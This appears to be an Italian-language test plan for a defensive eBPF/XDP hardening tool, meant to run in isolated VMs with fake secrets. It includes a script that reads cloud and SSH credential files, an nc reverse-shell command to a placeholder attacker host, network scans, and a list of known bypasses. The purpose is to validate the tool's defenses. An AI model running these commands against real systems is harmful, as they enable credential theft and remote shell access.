# TESTING_LAB — scenario reale aggiornato (post-fix, in VM isolata)

> Lab = 2 VM Ubuntu 24.04 in rete host-only, snapshot `pulito` prima di tutto,
> solo segreti FINTI. Mai su host reale, mai con credenziali vere, mai in bridge.

## 0. Lab

- Hypervisor KVM/VirtualBox/VMware. `victim` (4GB, kernel ≥5.15, BTF in
  `/sys/kernel/btf/vmlinux`) + `attacker` (stessa host-only, no NAT).
- Condivise OFF, clipboard OFF. Snapshot prima di ogni fase.
- Victim: clona repo, `make build`. Se `/sys/kernel/security/lsm` senza `bpf`:
  append GRUB + reboot (in VM è gratis, su host no).

## 1. Simulatori malware benigni (sandbox, no persistenza/spread/C2)

`~/lab/mal.py` (solo `open()` + stampa, zero esfiltrazione fuori lab):

```python
import os
targets = [os.path.expanduser("~/.kube/config"),
    os.path.expanduser("~/.aws/credentials"),
    os.path.expanduser("~/.ssh/id_ed25519")]
for t in targets:
    try:
        with open(t) as f: print("LETTO", t, len(f.read()))
    except PermissionError: print("NEGATO", t)
    except FileNotFoundError: print("ASSENTE", t)
```

Postinstall simulata: shell che lancia `mal.py` con tuoi permessi (come dipendenza
compromessa). Reverse shell solo host-only: attacker `nc -lvnp 4444`, victim
`nc <attacker> 4444 -e /bin/bash` da utente normale. Kill + restore dopo.

## 2. Fase 1 — LSM (`mode: enforce`, `/tmp/zt-test.yaml`)

```bash
cat ~/.kube/config            # atteso EACCES
python3 ~/lab/mal.py          # atteso NEGATO x3 + log regole cloud-creds/ssh-keys
kubectl config view           # atteso OK (whitelist)
cp /usr/bin/cat /tmp/ssh && /tmp/ssh ~/.kube/config   # atteso NEGATO (inode)
git hash-object ~/.kube/config      # atteso NEGATO (fix: git fuori da ssh-keys)
git hash-object ~/.git-credentials # atteso RIESCE (limite noto, git in dev-tokens)
echo append >> ~/.kube/config       # write-only senza READ: ora PASSA (fix FMODE_READ)
for i in $(seq 1 200); do cat ~/.kube/config 2>/dev/null; done  # flood: ~50 log + riepilogo soppressi
```

Log: `🚨 [BLOCCATO] regola=... exe=...` dice binario da autorizzare.
`exe=` vuoto = processo già uscito (best-effort, PID reuse possibile).

## 3. Fase 2 — XDP + poisoning

Config `/tmp/zt-xdp.yaml`: `interface: <reale-lab>`, `block_subnets: [<attacker>/32]`.

```bash
ping -c3 <victim>                        # da attacker: 100% loss
nmap -sS -Pn <victim>                    # dopo harden: filtered
echo -n | nc -u -w1 <victim> 5355        # query: DROP
sudo nping --udp --source-port 5355 <victim> -p 50000  # risposta: DROP (fix sport)
sudo bpftool prog show name xdp_shield   # run_cnt cresce (bpf_stats_enabled=1)
```

VLAN: ripeti su rete taggata → ora DROP (fix unwrap). Doppio-tag resta PASS (noto).
Mai gateway/DNS in `block_subnets` (scarta anche risposte). `/<8` ora rifiutato.

## 4. Fase 3 — resolver (`harden_system.sh public-wifi`, snapshot prima per UFW)

```bash
grep -E 'LLMNR|MulticastDNS' /etc/systemd/resolved.conf  # no / no
sudo tcpdump -i any -n "port 5355 or port 5353" &
ping -c1 host-inesistente-xyz.local   # atteso silenzio (unicast al DoT)
systemctl is-enabled avahi-daemon     # disabled
```

## 5. Fase 4 — FIDO2/agent

Senza token: chiave software + passphrase (debole, su disco). Con token `-sk`:
`git commit` senza tocco → timeout; `ssh-add -c` solo per software.

## 6. Fase 5 — end-to-end da reverse shell

Dalla shell remota: `cat ~/.ssh/id_*`, `cat ~/.kube/config`, `python3 ~/lab/mal.py`
→ `Permesso negato` + log victim. `kubectl` dalla shell → passa (whitelist =
canale). `io_uring` artigianale → passa (limite noto, fail-open).

## 7. Checklist pass / rollback

`bpf` in lsm, entrambi i prog in `bpftool`, EACCES cat, kubectl ok, `/tmp/ssh`
negato, git-kube negato / git-creds riesce, flood riepilogato, ping loss,
`run_cnt` cresce, `sport 5355` droppata, tcpdump muto, commit senza tocco ko
(solo con token). Rollback: `pkill zt-shield` (+ `bpftool` vuoto = non protetto)
o restore snapshot; resolver da `resolved.conf.zt-backup`.
